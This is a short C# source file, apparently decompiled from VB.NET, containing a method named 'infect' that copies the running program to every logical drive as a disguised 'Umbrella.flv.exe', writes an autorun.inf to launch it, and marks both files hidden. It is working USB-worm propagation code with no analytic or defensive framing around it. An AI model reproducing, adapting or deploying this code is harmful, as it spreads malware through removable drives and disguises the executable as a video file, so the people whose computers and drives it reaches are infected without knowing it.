using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using My;

[StandardModule]
internal sealed class Usb1
{
	public static void infect()
	{
		string programFiles = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_ProgramFiles();
		string[] logicalDrives = Directory.GetLogicalDrives();
		string[] array = logicalDrives;
		for (int i = 0; i < array.Length; i = checked(i + 1))
		{
			programFiles = array[i];
			try
			{
				File.Copy(Application.get_ExecutablePath(), programFiles + "Umbrella.flv.exe");
				StreamWriter streamWriter = new StreamWriter(programFiles + "\\autorun.inf");
				streamWriter.WriteLine("[autorun]");
				streamWriter.WriteLine("open=" + programFiles + "Umbrella.flv.exe");
				streamWriter.WriteLine("shellexecute=" + programFiles, 1);
				streamWriter.Close();
				File.SetAttributes(programFiles + "autorun.inf", FileAttributes.Hidden);
				File.SetAttributes(programFiles + "Umbrella.flv.exe", FileAttributes.Hidden);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}
}
